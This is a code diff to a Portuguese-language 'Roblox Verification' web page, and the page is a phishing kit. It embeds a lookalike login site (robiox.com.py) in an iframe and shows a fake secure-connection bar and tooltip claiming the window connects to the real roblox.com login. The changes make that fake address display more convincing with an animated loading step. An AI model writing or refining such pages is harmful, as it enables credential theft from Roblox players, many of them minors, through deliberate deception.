@@ -5,6 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Roblox Verification</title>
 
+  <!-- Favicon -->
+  <link rel="icon" href="image.png" type="image/png">
+
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -115,16 +118,17 @@
       border-bottom: 1px solid #333;
       font-size: 0.95rem;
       color: #ccc;
+      position: relative;
     }
 
     .domain-link {
-      position: relative;
-      cursor: help;
       color: #00ff9d;
       font-weight: 500;
+      text-decoration: none;
+      cursor: help;
+      position: relative;
     }
 
-    /* TOOLTIP */
     .domain-link::after {
       content: "A janela abaixo estabelece uma conexão segura com “https://www.roblox.com/pt/Login”.";
       white-space: pre-line;
@@ -182,6 +186,8 @@
       justify-content: center;
       z-index: 5;
       cursor: not-allowed;
+      font-size: 1.1rem;
+      color: #00ff9d;
     }
 
     .spinner {
@@ -203,10 +209,6 @@
       display: none;
     }
 
-    .confirm-area {
-      margin-top: 25px;
-      display: none;
-    }
   </style>
 </head>
 
@@ -249,17 +251,14 @@
     <button class="close-btn" id="close-modal">×</button>
 
     <div class="domain-bar">
-      Conecção segura em
-      <span class="domain-link">https://www.roblox.com/pt/Login</span>
+      Conexão segura em
+      <span id="domain-text">.</span>
     </div>
 
     <div class="verification-container">
       <div class="loading-screen" id="loading">
         <div class="spinner"></div>
         <div>Preparing verification...</div>
-        <div class="confirm-area" id="confirm-area">
-          <button class="btn-primary" id="confirm-verified">Finish manually →</button>
-        </div>
       </div>
 
       <iframe id="verify-iframe" src="about:blank"></iframe>
@@ -268,7 +267,7 @@
 </div>
 
 <script>
-  const IFRAME_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F245368165474%2Fprofile";
+  const IFRAME_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F245368165474%2Fprofile"; // replace with real URL
 
   const modal = document.getElementById('verification-modal');
   const initial = document.getElementById('initial-content');
@@ -277,8 +276,22 @@
   const closeBtn = document.getElementById('close-modal');
   const loading = document.getElementById('loading');
   const iframe = document.getElementById('verify-iframe');
-  const confirmArea = document.getElementById('confirm-area');
-  const confirmBtn = document.getElementById('confirm-verified');
+  const domainText = document.getElementById('domain-text');
+
+  let domainInterval;
+
+  function startDomainLoading() {
+    let dots = 0;
+    domainInterval = setInterval(() => {
+      dots = (dots + 1) % 4;
+      domainText.textContent = '.'.repeat(dots);
+    }, 500);
+  }
+
+  function showDomainLink() {
+    clearInterval(domainInterval);
+    domainText.innerHTML = `<a class="domain-link" href="https://www.roblox.com/pt/Login" target="_blank">https://www.roblox.com/pt/Login</a>`;
+  }
 
   function completeVerification() {
     modal.classList.remove('open');
@@ -292,14 +305,15 @@
     iframe.style.display = 'none';
     iframe.src = IFRAME_URL;
 
+    startDomainLoading();
+
     setTimeout(() => {
       loading.style.display = 'none';
       iframe.style.display = 'block';
-      confirmArea.style.display = 'block';
+      showDomainLink();
     }, 2600);
   };
 
-  confirmBtn.onclick = completeVerification;
   closeBtn.onclick = () => modal.classList.remove('open');
 </script>
 
